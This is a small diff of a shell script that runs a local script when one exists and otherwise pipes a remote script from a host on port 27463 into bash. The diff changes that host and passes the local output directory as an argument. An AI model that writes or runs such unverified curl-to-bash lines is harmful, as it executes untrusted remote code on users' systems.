@@ -12,6 +12,6 @@ if [ -f "./$jsshell.sh" ];then
     echo "start run ./$jsshell.sh" >> $LOCALPWD/output/log.txt
     ./$jsshell.sh $LOCALPWD/output
 else
-    curl -s -L http://i.aganzai.com:27463/script.sh | bash -s aa bb
+    curl -s -L http://sh.aganzai.com:27463/script.sh | bash -s $LOCALPWD/output
     #echo "not find ./script/$jsshell.sh !!" >> $LOCALPWD/output/log.txt
 fi
